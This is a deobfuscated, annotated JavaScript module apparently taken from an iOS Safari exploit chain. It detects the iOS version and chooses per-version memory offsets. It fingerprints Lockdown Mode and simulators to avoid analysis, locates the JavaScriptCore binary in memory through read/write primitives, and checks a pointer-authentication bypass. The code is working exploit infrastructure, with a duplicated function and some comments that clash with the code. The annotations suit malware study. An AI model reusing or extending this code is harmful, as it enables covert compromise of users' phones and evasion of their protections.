/**
 * Platform Detection Module (Deobfuscated)
 * Original module hash: "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
 *
 * This module is responsible for:
 *   1. Detecting the iOS version from the browser user agent string
 *   2. Selecting version-specific offsets and feature flags based on the detected version
 *   3. Detecting Lockdown Mode (via IndexedDB Blob URL test)
 *   4. Detecting the iOS Simulator (via lockdown-mode CSS check)
 *   5. Determining the runtime type (LTgSl5 / PSNMWj / RoAZdq) based on
 *      the Mach-O CPU type found in the JSC memory region
 *   6. Providing PAC (Pointer Authentication Code) integrity checking
 *
 * Runtime names correspond to exploit primitive configurations:
 *   - "LTgSl5" : Initial default, set during init(). Used when CPU_TYPE_X86_64 is detected.
 *                 Throws an error if still set after detectRuntime(), as it indicates simulator.
 *   - "RoAZdq" : Selected when CPU_TYPE_X86_64 (0x01000007) Mach-O is found (refined offsets).
 *   - "PSNMWj" : Selected when CPU_TYPE_ARM64 (0x0100000C) Mach-O is found (iOS device offsets).
 */

let m_14669ca3b1519ba2a8f40be287f646d4d7593eb0 = () => {
  let r = {};

  /**
   * Module dependency: "57620206d62079baad0e57e6d9ec93120c0f5247"
   * This is the utility module, imported twice:
   *   - `x` is the full export (used for x.Int64.fromNumber() - likely a BigInt utility)
   *   - `G` is destructured as { N: G } (the N export from utility module)
   */
  const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
    // { N: G } = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),

    /**
     * Platform state object - central state store for the exploit's platform knowledge.
     * All platform detection results, offsets, and runtime primitives are stored here.
     */
    platformState = {
      /** @type {string|null} navigator.platform value (e.g. "MacIntel", "iPhone") */
      platform: null,

      /** @type {string|null} navigator.userAgent string */
      userAgent: null,

      /** @type {string} Detected browser type ("safari" or error) */
      browserType: "",

      /** @type {string} Runtime identifier: "LTgSl5", "PSNMWj", or "RoAZdq" */
      runtime: "",

      /** @type {number} Numeric iOS version (e.g. 170200 = iOS 17.2.0) */
      iOSVersion: 0,

      /** @type {*} Reserved / generation field */
      Gn: null,

      /** @type {number} Reserved numeric field */
      Fn: 0,

      /** @type {boolean} Whether PAC (Pointer Authentication) is enabled */
      hasPAC: false,

      /** @type {boolean|undefined} Lockdown Mode detection result */
      _n: undefined,

      /** @type {*} JSC memory base address (BigInt pointer) */
      yn: null,

      /** @type {string} Telemetry string 1 (passed from caller) */
      Tn: "",

      /** @type {string} Telemetry string 2 (passed from caller) */
      pn: "",

      /** @type {string} Telemetry string 3 (passed from caller) */
      Kn: "",

      /** @type {boolean} Whether to allow webdriver (navigator.webdriver) */
      allowWebdriver: false,

      /** @type {boolean} Secondary flag passed from caller */
      Pn: false,

      /** @type {Object} Version-specific offsets and feature flags */
      versionFlags: {},

      /** @type {*} Mach-O parser instance */
      machOParser: null,

      /** @type {*} Exploit read/write primitive object */
      exploitPrimitive: null,

      /** @type {*} Reserved state field */
      Dn: null,

      /** @type {*} Reserved nullable state field */
      Ln: null,

      /** @type {*} Caller reference */
      caller: null,

      /** @type {*} Reserved nullable state field */
      Wn: null,

      /** @type {*} Reserved nullable state field */
      Zn: null,

      /** @type {*} PAC bypass primitive */
      pacBypass: null,

      /** @type {*} Reserved nullable state field */
      jn: null,

      /** @type {*} SandboxEscape primitive */
      sandboxEscape: null,

      /** @type {*} Reserved nullable state field */
      Jn: null,

      /** @type {*} Cached lockdown detection result (Promise result) */
      kn: null,

      /** @type {*} Cached simulator detection result (Promise result) */
      Qn: null,

      /** @type {boolean} Reserved boolean flag */
      qn: false
    };
  r.zn = r.platformState = platformState;

  // =========================================================================
  // VERSION-SPECIFIC OFFSET TABLES
  // =========================================================================
  //
  // Each runtime has an array of offset entries ordered from highest version
  // threshold (minVersion / GFx77t) to lowest. The applyVersionOffsets()
  // function reverses the array, starts with the lowest-version entry as
  // the base, then merges entries whose minVersion exceeds the detected
  // iOS version, effectively building up the correct offset set for the
  // running iOS version.
  //
  // Property names (e.g. TryHSU, ZHsObe, etc.) are opaque keys used
  // throughout the exploit chain to look up specific struct offsets,
  // feature flags, and size constants.
  // =========================================================================

  const versionOffsetTable = {

    /**
     * LTgSl5 offsets - used as the initial runtime.
     * If CPU_TYPE_X86_64 is detected, this runtime is flagged as error (simulator).
     * Entries ordered from highest minVersion to lowest.
     */
    LTgSl5: [
    {
      /* minVersion */GFx77t: 260000,
      /* iOS 26.x — new exploit chain required */
      Bv9KmR: true,
      JtEUci: false,
      KeCRDQ: false
    },
    {
      /* minVersion */GFx77t: 180000,
      /* iOS 18.x — new exploit chain required */
      Xp4WqZ: true,
      JtEUci: false,
      KeCRDQ: false
    },
    {
      /* minVersion */GFx77t: 170300,
      JtEUci: false
    },
    {
      /* minVersion */GFx77t: 170200,
      wC3yaB: true,
      wYk8Jg: true
    },
    {
      /* minVersion */GFx77t: 170000,
      UPk5PY: 96,
      ZHsObe: 104
    },
    {
      /* minVersion */GFx77t: 160600,
      JtEUci: true,
      KeCRDQ: false,
      NfRtuR: 112,
      DjRSp0: 8,
      LVt9Wy: 24,
      PfAPxk: 768,
      JGRSu4: 144,
      vqbEzc: 96,
      jtUNKB: 16,
      MJf4mX: 328,
      zPL1kr: 472,
      yjShKn: 512,
      ga3074: 520,
      oHmyQl: 664,
      PCsIV0: 8,
      vnu2oq: 0,
      attyap: 4,
      FGsnBi: 12,
      pUvASJ: 16,
      sMuYjH: 20,
      KSrWFg: 3,
      msD22k: 32,
      LM9blg: 48,
      SAobkS: 16,
      TLJcwX: 44,
      kA39V6: 48,
      OaAnPR: 56,
      qRQJn0: 32,
      oBPlWp: 64
    },
    {
      /* minVersion */GFx77t: 160400,
      cyTrSt: 176,
      UPk5PY: 88,
      ZHsObe: 96
    },
    {
      /* minVersion */GFx77t: 160200,
      KeCRDQ: true,
      ShQCsB: false,
      TryHSU: 16,
      FFwSQ4: 64,
      hYaJ7z: 24,
      JIIaFf: 16,
      kQj6yR: 32,
      dvuEmf: 28,
      uLSxli: 24,
      wA6rmI: 8,
      iWQGB1: 16
    },
    {
      /* minVersion */GFx77t: 150600,
      ShQCsB: true,
      RbKS6p: false
    },
    {
      /* minVersion */GFx77t: 150400,
      xK8SW0: 64
    },
    {
      /* minVersion */GFx77t: 150200,
      RbKS6p: true,
      mmrZ0r: false
    },
    {
      /* minVersion */GFx77t: 130006,
      zpy6Mu: 16
    },
    {
      /* minVersion */GFx77t: 130001,
      zpy6Mu: 24,
      xK8SW0: 72
    },
    {
      /* minVersion */GFx77t: 110000,
      mmrZ0r: true,
      RbKS6p: false,
      ShQCsB: false,
      KeCRDQ: false,
      xK8SW0: 64,
      zpy6Mu: 24,
      KaU4Z7: 24,
      oGn3OG: 16,
      CN3rr_: 16,
      EMDU4o: 0,
      fGOrHX: 16,
      QwY9S3: false,
      wC3yaB: false
    },
    {
      /* minVersion */GFx77t: 100000,
      sKfNmf: false
    }],


    /**
     * PSNMWj offsets - selected when CPU_TYPE_ARM64 (0x0100000C) Mach-O is found.
     * This is the primary iOS device runtime with the most detailed offset table.
     */
    PSNMWj: [
    {
      /* minVersion */GFx77t: 260000,
      /* iOS 26.x — new PAC bypass required */
      Hm7RvN: true,
      wF8NpI: false,
      CpDW_T: false,
      LJ1EuL: false,
      QwxZcT: false,
      IqxL92: false
    },
    {
      /* minVersion */GFx77t: 180000,
      /* iOS 18.x — new PAC bypass required */
      Yt3FsK: true,
      wF8NpI: false,
      CpDW_T: false,
      LJ1EuL: false,
      QwxZcT: false,
      IqxL92: false
    },
    {
      /* minVersion */GFx77t: 170000,
      wF8NpI: true,
      CpDW_T: false,
      LJ1EuL: false,
      QwxZcT: false,
      IqxL92: false
    },
    {
      /* minVersion */GFx77t: 160600,
      LJ1EuL: true
    },
    {
      /* minVersion */GFx77t: 160300,
      CpDW_T: true,
      QwxZcT: false,
      IqxL92: false,
      KJy28q: 16,
      JocAcH: 328,
      Kx7EsT: 472,
      Wr7XGb: 512,
      GANQhD: 520,
      PR7o33: 664,
      YXGv5g: 8,
      jV_CXG: 0,
      Itxnt2: 4,
      ctnJOf: 12,
      ZU88w_: 16,
      qfMZYC: 20,
      tIQDib: 3,
      DqxT1K: 32,
      vso7lF: 48,
      XuTBrC: 16,
      TG9DBr: 44,
      eEkK60: 48,
      qDuMzc: 56,
      YNgf0L: 32,
      wSYvOp: 112,
      gFT0ks: 8,
      xjqua8: 24
    },
    {
      /* minVersion */GFx77t: 160000,
      QwxZcT: true
    },
    {
      /* minVersion */GFx77t: 150600,
      juV600: true,
      Lg4V8D: true
    },
    {
      /* minVersion */GFx77t: 150500,
      ptTH_q: false,
      kEXt5Z: 464,
      RNiPoX: 1048575,
      MhLcu0: 256
    },
    {
      /* minVersion */GFx77t: 150400,
      NUFCII: true,
      jY1sqq: 224,
      sKfNmf: true,
      wU9pm_: 48
    },
    {
      /* minVersion */GFx77t: 150100,
      rD3mNF: 5
    },
    {
      /* minVersion */GFx77t: 150000,
      IqxL92: true,
      OwGD0F: true,
      IsjfuV: false,
      OaAgtr: 8,
      rvXShf: 48
    },
    {
      /* minVersion */GFx77t: 140102,
      IsjfuV: true,
      PIQrsf: 216
    },
    {
      /* minVersion */GFx77t: 140100,
      KrBQWx: 140,
      Kmb3Lc: 21
    },
    {
      /* minVersion */GFx77t: 140003,
      TyPY6G: true,
      NUd9MZ: 208,
      dzBoEE: 312,
      cxrfKw: 168
    },
    {
      /* minVersion */GFx77t: 140000,
      PgkJIA: true,
      DXnm2a: 568,
      wU9pm_: 40
    },
    {
      /* minVersion */GFx77t: 130100,
      KaU4Z7: 16,
      xlJ9NK: false,
      rvXShf: 56
    },
    {
      /* minVersion */GFx77t: 130001,
      KaU4Z7: 24,
      rvXShf: 64
    },
    {
      /* minVersion */GFx77t: 130000,
      xlJ9NK: true
    },
    {
      /* minVersion */GFx77t: 120000,
      zpy6Mu: 16,
      KaU4Z7: 16,
      rvXShf: 56
    },
    {
      /* minVersion */GFx77t: 110000,
      iNLXaz: 8,
      xK8SW0: 72
    },
    {
      /* minVersion: base entry for all versions >= 100000 */
      GFx77t: 100000,
      QwxZcT: false,
      juV600: false,
      Lg4V8D: false,
      cxrfKw: 168,
      oGn3OG: 16,
      NUFCII: false,
      CN3rr_: 16,
      fGOrHX: 16,
      EMDU4o: 0,
      Ps7Z2u: 24,
      iNLXaz: 24,
      KaU4Z7: 24,
      ZiIyeM: 24,
      zpy6Mu: 24,
      xK8SW0: 80,
      rvXShf: 64,
      VTwyJG: 32,
      VEwXfI: 40,
      zohDDd: true,
      DXnm2a: 560,
      PgkJIA: false,
      xlJ9NK: false,
      TyPY6G: false,
      dzBoEE: 168,
      SiBW7G: 8,
      PyEQqC: 56,
      iBTCSN: 200,
      csgakW: 204,
      ydHN48: 0,
      KrBQWx: 128,
      Kmb3Lc: 1,
      IsjfuV: false,
      IqxL92: false,
      OwGD0F: false,
      rD3mNF: 7,
      ptTH_q: false,
      MhLcu0: 232
    }],


    /**
     * RoAZdq offsets - selected when CPU_TYPE_X86_64 (0x01000007) Mach-O is found.
     * This is a smaller table with refinements on top of the PSNMWj base.
     */
    RoAZdq: [
    {
      /* minVersion */GFx77t: 150000,
      rvXShf: 48
    },
    {
      /* minVersion */GFx77t: 130006,
      rvXShf: 56
    },
    {
      /* minVersion */GFx77t: 120000,
      zpy6Mu: 16,
      KaU4Z7: 16
    },
    {
      /* minVersion */GFx77t: 110000,
      iNLXaz: 8,
      xK8SW0: 72
    },
    {
      /* minVersion: base entry for all versions >= 100000 */
      GFx77t: 100000,
      oGn3OG: 16,
      CN3rr_: 16,
      rvXShf: 64,
      fGOrHX: 16,
      EMDU4o: 0,
      csgakW: 204,
      iBTCSN: 200,
      Ps7Z2u: 24,
      iNLXaz: 24,
      KaU4Z7: 24,
      ZiIyeM: 24,
      zpy6Mu: 24,
      dzBoEE: 168,
      SiBW7G: 8,
      xK8SW0: 64,
      VTwyJG: 32,
      VEwXfI: 40,
      zohDDd: false,
      DXnm2a: 560,
      PgkJIA: false
    }]

  };

  // =========================================================================
  // LOCKDOWN MODE DETECTION
  // =========================================================================

  /**
   * Synchronous check for Lockdown Mode.
   *
   * On desktop Safari (platform === "MacIntel"), Lockdown Mode is inferred
   * by checking whether the "TouchEvent" constructor exists on the window
   * object. If the platform is "MacIntel" and TouchEvent is absent, Lockdown
   * Mode is assumed to be active.
   *
   * The result is cached in platformState.isLockdownMode after the first call.
   *
   * @returns {boolean} true if Lockdown Mode is detected
   */
  function checkLockdownMode() {
    let t = false;
    return undefined === platformState._n ? (

    "MacIntel" === platformState.platform &&
    -1 === Object.getOwnPropertyNames(window).indexOf("TouchEvent") && (
    t = true),
    platformState._n = t) :

    t = platformState._n,
    t;
  }

  // =========================================================================
  // VERSION OFFSET APPLICATION
  // =========================================================================

  /**
   * Apply version-specific offsets to platformState.versionFlags.
   *
   * The offset table for the current runtime is reversed (so it goes from
   * lowest minVersion to highest). The first entry becomes the base, and
   * subsequent entries whose minVersion exceeds the detected iOS version
   * cause the loop to break - meaning only entries with minVersion <= xn
   * are merged in.
   *
   * This builds up the correct set of offsets and feature flags for the
   * exact iOS version running on the device.
   */
  function applyVersionOffsets() {
    const t = versionOffsetTable[platformState.runtime].reverse();
    let n = Object.assign(platformState.versionFlags, t[0]);
    for (const r of t.slice(1)) {
      if (r.GFx77t > platformState.iOSVersion) break;
      n = Object.assign(n, r);
    }
    platformState.versionFlags = n;
  }

  // =========================================================================
  // EXPORTED FUNCTIONS
  // =========================================================================

  /**
   * Check if Lockdown Mode is active.
   * @returns {boolean}
   */
  r.On = checkLockdownMode;

  /**
   * Check if Lockdown Mode is active AND the runtime is "RoAZdq".
   * This combination indicates lockdown mode on a Safari/x86_64 target.
   * @returns {boolean}
   */
  r.Vn = function () {
    return checkLockdownMode() && "RoAZdq" === platformState.runtime;
  };

  /**
   * Get the exploit read/write primitive. Throws if not yet initialized.
   * @returns {*} The exploit primitive object (provides tr, nr, rr, ir methods)
   */
  r.exploitPrimitive = function () {
    if (null === platformState.exploitPrimitive) throw new Error("null === platformState.exploitPrimitive");
    return platformState.exploitPrimitive;
  };

  /**
   * Asynchronously detect Lockdown Mode using multiple strategies:
   *
   * 1. If navigator.webdriver is true and En is false, throws an error.
   *    If En is true, resolves false (not lockdown).
   *
   * 2. If navigator.maxTouchPoints is defined (modern iOS):
   *    - Opens a temporary IndexedDB database
   *    - Attempts to store a Blob in an object store named "test"
   *    - If BlobURLs are not supported (Lockdown Mode restriction), the
   *      operation throws with a message matching /BlobURLs are not yet supported/
   *    - This is the primary lockdown detection signal
   *
   * 3. If navigator.maxTouchPoints is undefined (older iOS / desktop):
   *    - Tests window.openDatabase (WebSQL) - if it throws, lockdown is active
   *    - Tests localStorage.setItem/removeItem with key "test" - if it throws,
   *      lockdown is active
   *
   * Results are cached in platformState.kn.
   * Times out after 5000ms, defaulting to false.
   *
   * @returns {Promise<boolean>} true if Lockdown Mode is detected
   */
  r.Yn = async function () {
    if (null !== platformState.kn) return platformState.kn;
    {
      const t = new Promise(function (t, n) {
        let r = false;

        function o(n) {
          r = true;
          t(n);
        }

        if (true === navigator.webdriver) {
          //if (!platformState.allowWebdriver) throw new Error("!platformState.allowWebdriver");
          o(false);
        } else if (undefined !== navigator.maxTouchPoints) {
          /* Modern iOS: IndexedDB Blob URL test */
          (function () {
            const t = String(Math.random());
            try {
              window.indexedDB.open(t, 1).onupgradeneeded = function (n) {
                let r;
                const e =
                null === (r = n.target) || undefined === r ?
                undefined :
                r.result;
                try {
                  e.createObjectStore("test", {
                    autoIncrement: true
                  }).put(new Blob());
                  o(false);
                } catch (t) {
                  let n,
                    r = t;
                  if (t instanceof Error) {
                    r = null !== (n = t.message) && undefined !== n ? n : t;
                  }
                  return "string" != typeof r ?
                  o(false) :
                  o(/BlobURLs are not yet supported/.test(r));
                } finally {
                  e.close();
                  window.indexedDB.deleteDatabase(t);
                }
              };
            } catch (t) {
              return o(false);
            }
          })();
        } else {
          /* Older iOS / desktop: WebSQL + localStorage test */
          (function () {
            const t = window.openDatabase,
              n = window.localStorage;
            try {
              t(null, null, null, null);
            } catch (t) {
              return o(true);
            }
            try {
              n.setItem("test", "1");
              n.removeItem("test");
            } catch (t) {
              return o(true);
            }
            o(false);
          })();
        }

        /* Timeout fallback: resolve false after 5000ms */
        setTimeout(function () {
          r || t(false);
        }, 5000);
      });
      return platformState.kn = await t, platformState.kn;
    }
  };

  /**
   * Asynchronously detect iOS Simulator.
   *
   * The detection uses a multi-signal approach:
   *   1. Checks for the presence of WebRTC-related globals that should not
   *      exist in certain simulator builds:
   *      - "mozRTCPeerConnection"
   *      - "RTCPeerConnection"
   *      - "webkitRTCPeerConnection"
   *      - "RTCIceGatherer"
   *
   *   2. Checks for the absence of WebGLRenderingContext (simulators may
   *      not support WebGL).
   *
   *   3. Performs a CSS Lockdown Mode heuristic:
   *      - Injects a <div> with id "ldm_mml_t" containing a MathML element
   *        with mathcolor="blue" and content "14"
   *      - Reads the computed color of the inner <mn> element
   *      - If the color is NOT "rgb(0, 0, 255)" (blue), it indicates
   *        Lockdown Mode is active (MathML is restricted), which means
   *        this is NOT a simulator
   *
   * The result is true if the environment is NOT a simulator.
   * Results are cached in platformState.Qn.
   *
   * @returns {Promise<boolean>} true if NOT a simulator
   */
  r.Hn = async function () {
    if (null !== platformState.Qn) return platformState.Qn;
    {
      const t = new Promise(function (t, n) {
        return t(
          !(
          [
          "mozRTCPeerConnection",
          "RTCPeerConnection",
          "webkitRTCPeerConnection",
          "RTCIceGatherer"].
          some((t) => t in globalThis) &&
          !globalThis.WebGLRenderingContext &&
          !function () {
            const t = "ldm_mml_t",
              n = document.createElement("div");
            n.setAttribute("id", t);
            n.innerHTML =
            '<math style="display: none"><mrow mathcolor="blue"><mn>14</mn></mrow></math>';
            const r =
            undefined !== document.body ?
            document.body :
            document.firstChild;
            r.appendChild(n);
            const o =
            "rgb(0, 0, 255)" ===
            globalThis.getComputedStyle(
              n.firstChild.firstChild,
              null
            ).color;
            return r.removeChild(document.getElementById(t)), o;
          }())

        );
      });
      return platformState.Qn = await t, platformState.Qn;
    }
  };

  /**
   * Asynchronously detect iOS Simulator.
   *
   * The detection uses a multi-signal approach:
   *   1. Checks for the presence of WebRTC-related globals that should not
   *      exist in certain simulator builds:
   *      - "mozRTCPeerConnection"
   *      - "RTCPeerConnection"
   *      - "webkitRTCPeerConnection"
   *      - "RTCIceGatherer"
   *
   *   2. Checks for the absence of WebGLRenderingContext (simulators may
   *      not support WebGL).
   *
   *   3. Performs a CSS Lockdown Mode heuristic:
   *      - Injects a <div> with id "ldm_mml_t" containing a MathML element
   *        with mathcolor="blue" and content "14"
   *      - Reads the computed color of the inner <mn> element
   *      - If the color is NOT "rgb(0, 0, 255)" (blue), it indicates
   *        Lockdown Mode is active (MathML is restricted), which means
   *        this is NOT a simulator
   *
   * The result is true if the environment is NOT a simulator.
   * Results are cached in platformState.Qn.
   *
   * @returns {Promise<boolean>} true if NOT a simulator
   */
  r.Hn = async function () {
    if (null !== platformState.Qn) return platformState.Qn;
    {
      const t = new Promise(function (t, n) {
        return t(![
        "mozRTCPeerConnection",
        "RTCPeerConnection",
        "webkitRTCPeerConnection",
        "RTCIceGatherer"].
        some((t) => t in globalThis) &&
        !globalThis.WebGLRenderingContext && !function () {
          const t = "ldm_mml_t",
            n = document.createElement("div");
          n.setAttribute("id", t);
          n.innerHTML =
          '<math style="display: none"><mrow mathcolor="blue"><mn>14</mn></mrow></math>';
          const r =
          undefined !== document.body ?
          document.body :
          document.firstChild;
          r.appendChild(n);
          const o =
          "rgb(0, 0, 255)" ===
          globalThis.getComputedStyle(
            n.firstChild.firstChild,
            null
          ).color;
          return r.removeChild(document.getElementById(t)), o;
        }());
      });
      return platformState.Qn = await t, platformState.Qn;
    }
  };

  /**
   * Check PAC (Pointer Authentication Code) integrity.
   *
   * This function creates a small WebAssembly module with two exported
   * functions (i32.add and i32.sub) and verifies that their function
   * pointers maintain PAC integrity through the exploit's read/write
   * primitive.
   *
   * The WASM module (hex: 0061736d 01000000...):
   *   - Type section: one function type (i32, i32) -> i32
   *   - Function section: two functions of that type
   *   - Export section: exports "a" (i32.add) and "b" (i32.sub)
   *
   * For each exported function:
   *   1. Reads the JSObject pointer via Xn.addrof()
   *   2. Reads the native function pointer at JSObject + offsets.rvXShf
   *   3. Uses Xn.readInt64FromOffset() to read the raw pointer
   *   4. Extracts the data portion (o.Dt())
   *   5. Signs it with the PAC bypass (Mn.pacia()) using context 0x24AD
   *   6. Compares the re-signed pointer with the original (o.lt())
   *
   * If PAC is enabled (platformState.hasPAC) and sKfNmf flag is true,
   * the function performs the integrity check. Returns true if any
   * function pointer fails the PAC round-trip (indicating PAC bypass
   * issues).
   *
   * @returns {Promise<boolean>} true if PAC integrity check fails
   */
  r.$n = async function () {
    if (undefined === platformState.exploitPrimitive) throw new Error("undefined === platformState.exploitPrimitive");
    if (undefined === platformState.pacBypass) throw new Error("undefined === platformState.pacBypass");

    /** PAC signing context value: 0x24AD = 9389 */
    const t = utilityModule.Int64.fromNumber(9389);

    function n(n) {
      const r = function (t) {
          const n = platformState.exploitPrimitive.addrof(t);
          return platformState.exploitPrimitive.readRawBigInt(
            n +
            globalThis.moduleManager.getModuleByName(
              "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
            ).platformState.versionFlags.rvXShf
          );
        }(n),
        o = platformState.exploitPrimitive.readInt64FromOffset(r);
      return platformState.pacBypass.pacia(o.Dt(), t).lt(o);
    }

    if (
    platformState.hasPAC &&
    true ===
    globalThis.moduleManager.getModuleByName(
      "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
    ).platformState.versionFlags.sKfNmf)
    {
      /**
       * WebAssembly module bytes (decoded):
       * Magic: \0asm (00 61 73 6d)
       * Version: 1
       * Type section: 1 func type (i32, i32) -> i32
       * Function section: 2 functions
       * Export section: "a" = func 0, "b" = func 1
       * Code section:
       *   func 0: local.get 0, local.get 1, i32.add (0x6A)
       *   func 1: local.get 0, local.get 1, i32.sub (0x6B)
       */
      const t = new Uint8Array([
      0, 97, 115, 109, // \0asm magic
      1, 0, 0, 0, // version 1
      1, 7, 1, 96, // type section: 1 func type
      2, 127, 127, //   params: i32, i32
      1, 127, //   results: i32
      3, 3, 2, 0, 0, // function section: 2 funcs, both type 0
      7, 9, 2, // export section: 2 exports
      1, 97, 0, 0, //   "a" -> func 0
      1, 98, 0, 1, //   "b" -> func 1
      10, 17, 2, // code section: 2 function bodies
      7, 0, //   func 0: size=7, 0 locals
      32, 0, 32, 1, //     local.get 0, local.get 1
      106, //     i32.add
      11, //   end
      7, 0, //   func 1: size=7, 0 locals
      32, 0, 32, 1, //     local.get 0, local.get 1
      107, //     i32.sub
      11 //   end
      ]).buffer;

      const r = new WebAssembly.Module(t, {}),
        o = new WebAssembly.Instance(r, {}),
        e = o.exports.a,
        l = o.exports.b;
      return !n(e) || !n(l);
    }
    return false;
  };

  /**
   * Initialize the platform module.
   *
   * Parses the user agent string to determine iOS version and browser type,
   * stores telemetry parameters, sets the initial runtime to "LTgSl5",
   * and applies version-specific offsets.
   *
   * Supported user agent formats:
   *   - "Version/X.Y.Z" (standard Safari)
   *   - "MobileStore/1.0" + "iOS/X.Y.Z" (alternative Safari wrapper)
   *   - "iPhone OS X_Y_Z" (fallback UA parsing)
   *
   * Only "safari" browser type is accepted; other browsers cause an error.
   *
   * @param {string} fixedMachOVal3 - Telemetry string 1 (Tn)
   * @param {string} fixedMachOVal1 - Telemetry string 2 (pn)
   * @param {string} fixedMachOVal2 - Telemetry string 3 (Kn)
   * @param {boolean} o - Allow webdriver flag (En)
   * @param {boolean} e - Secondary flag (Pn / Pn)
   * @param {string} l - navigator.platform value
   * @param {string} i - navigator.userAgent string
   */
  r.init = function (fixedMachOVal3, fixedMachOVal1, fixedMachOVal2, o, e, l, i) {
    function c(t) {
      return 1 === t.length ? "0" + t : t;
    }

    platformState.fixedMachOVal3 = fixedMachOVal3;
    platformState.fixedMachOVal1 = fixedMachOVal1;
    platformState.fixedMachOVal2 = fixedMachOVal2;
    platformState.allowWebdriver = o;
    platformState.Pn = e;
    platformState.platform = l;

    /* Detect browser type from user agent */
    if (i.match(/Version/)) {
      platformState.browserType = "safari";
    } else {
      if (!i.match(/AppleWebKit\//))
      throw new Error("!i.match(/AppleWebKit\//)");
      platformState.browserType = "safari";
    }

    /* Only Safari is supported */
    if ("safari" !== platformState.browserType) throw new Error("safari !== platformState.browserType");

    /* Parse iOS version from user agent */
    let u = i.match(/Version\/(\d+)\.(\d+)(?:\.(\d+))?/);

    /* Fallback: check for "MobileStore/1.0" wrapper format */
    if (null === u && i.startsWith("MobileStore/1.0")) {
      u = i.match(/iOS\/(\d+)\.(\d+)(?:\.(\d+))?/);
    }

    /* Fallback: check for "iPhone OS X_Y_Z" format */
    if (null === u && i.match(/iPhone OS \d+_\d+(?:_\d+)?/)) {
      u = i.match(/iPhone OS (\d+)_(\d+)(?:_(\d+))?/);
    }

    if (null === u) throw new Error("null === u");

    /**
     * Convert version components to a 6-digit numeric format:
     *   major(2) + minor(2) + patch(2)
     *   e.g. iOS 17.2.0 -> "170200" -> 170200
     */
    const a = parseInt(c(u[1]) + c(u[2]) + (u[3] ? c(u[3]) : "00"), 10);

    platformState.iOSVersion = a;

    /* Set initial runtime to "LTgSl5" */
    platformState.runtime = "LTgSl5";

    /* Apply version-specific offsets for the initial runtime */
    applyVersionOffsets();
  };

  /**
   * Detect the actual runtime by scanning JSC memory for Mach-O headers.
   *
   * This function:
   *   1. Reads the JSObject pointers for WebAssembly.Table and
   *      WebAssembly.Instance to determine if PAC is enabled (their
   *      tagged pointers will differ if PAC signing is active).
   *
   *   2. Page-aligns the pointer and scans backward through memory in
   *      4096-byte (page-size) increments looking for the Mach-O 64-bit
   *      magic number 0xFEEDFACF.
   *
   *   3. Reads the CPU type field at offset +4 from the Mach-O header:
   *      - 0x01000007 (CPU_TYPE_X86_64) -> runtime = "RoAZdq"
   *      - 0x0100000C (CPU_TYPE_ARM64)  -> runtime = "PSNMWj"
   *
   *   4. Stores the Mach-O header address as platformState.yn.
   *
   *   5. If the runtime is still "LTgSl5" after detection, throws an error
   *      (this would indicate a simulator or unsupported environment).
   *
   *   6. Re-applies version offsets for the newly detected runtime and
   *      freezes the offsets object.
   */
  r.lr = function () {
    const t = (t) => {
        if (undefined === platformState.exploitPrimitive) throw new Error("undefined === platformState.exploitPrimitive");
        const n = platformState.exploitPrimitive.addrof(t);
        return platformState.exploitPrimitive.readInt64FromOffset(
          n +
          globalThis.moduleManager.getModuleByName(
            "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
          ).platformState.versionFlags.KaU4Z7
        );
      },
      n = t(WebAssembly.Table),
      r = t(WebAssembly.Instance);

    let o = n;

    /**
     * PAC detection: if the tagged pointers for Table and Instance differ
     * in their upper bits (et field), PAC is active.
     */
    if (n.et !== r.et) {
      platformState.hasPAC = true;
      window.log(`[PLATFORM] PAC (Pointer Authentication) detected`);
      o = o.Tt(); /* Strip PAC bits */
    }

    /**
     * Page-align the pointer downward (mask off lower 12 bits).
     * o.it is the lower 32 bits; % 4096 gives the page offset.
     */
    o = o.Bt(o.it % 4096);

    /**
     * Scan backward through memory pages looking for the Mach-O 64-bit
     * magic number 0xFEEDFACF. The read32FromInt64() method reads a 32-bit value,
     * and we compare against the full 64-bit representation:
     * 4294967296 + (-17958193) = 0xFEEDFACF = 4277009103
     */
    while (0xFEEDFACF !== platformState.exploitPrimitive.read32FromInt64(o)) {
      o = o.Bt(4096);
    }

    /**
     * Read the CPU type at Mach-O header + 4 bytes (cputype field in mach_header_64).
     */
    const e = platformState.exploitPrimitive.read32FromInt64(o.H(4));

    if (0x01000007 === e) {
      /* CPU_TYPE_X86_64 -> use RoAZdq runtime offsets */
      platformState.runtime = "RoAZdq";
    } else {
      if (0x0100000C !== e) throw new Error("0x0100000C !== e");
      /* CPU_TYPE_ARM64 -> use PSNMWj runtime offsets */
      platformState.runtime = "PSNMWj";
    }

    /* Store the JSC Mach-O base address */
    platformState.yn = o;
    window.log(`[PLATFORM] Runtime: ${platformState.runtime}, JSC base: 0x${o.it.toString(16)}`);

    /**
     * Safety check: if runtime is still "LTgSl5", something went wrong
     * (likely running in a simulator). Throw to abort.
     */
    if ("LTgSl5" === platformState.runtime) throw new Error("LTgSl5 === platformState.runtime");

    /* Re-apply version offsets for the newly detected runtime and freeze */
    applyVersionOffsets();
    Object.freeze(platformState.versionFlags);
  };

  /**
   * Get or create the Mach-O parser for the detected JSC binary.
   *
   * Uses module "ba712ef6c1bf20758e69ab945d2cdfd51e53dcd8" (the Mach-O
   * parsing module) to create a parser. The parser method called depends
   * on the runtime:
   *   - "PSNMWj" (ARM64) -> parser.ar() (ARM64 Mach-O parser)
   *   - "RoAZdq" (x86_64) -> parser.sr() (x86_64 Mach-O parser)
   *
   * Results are cached in platformState.machOParser.
   *
   * @returns {*} Mach-O parser instance
   */
  r.cr = function () {
    window.log(`[PLATFORM] Creating image list from JSC base address...`);
    let t;
    if (platformState.machOParser) {
      t = platformState.machOParser;
    } else {
      if (!platformState.yn) throw new Error("!platformState.yn");

      const n = globalThis.moduleManager.getModuleByName(
          "ba712ef6c1bf20758e69ab945d2cdfd51e53dcd8"
        ),
        r = platformState.machOParser = n.ur();

      if ("PSNMWj" === platformState.runtime) {
        t = r.ar();
      } else {
        if ("RoAZdq" !== platformState.runtime) throw new Error("RoAZdq !== platformState.runtime");
        t = r.sr();
      }
      platformState.machOParser = t;
    }
    return t;
  };

  return r;
};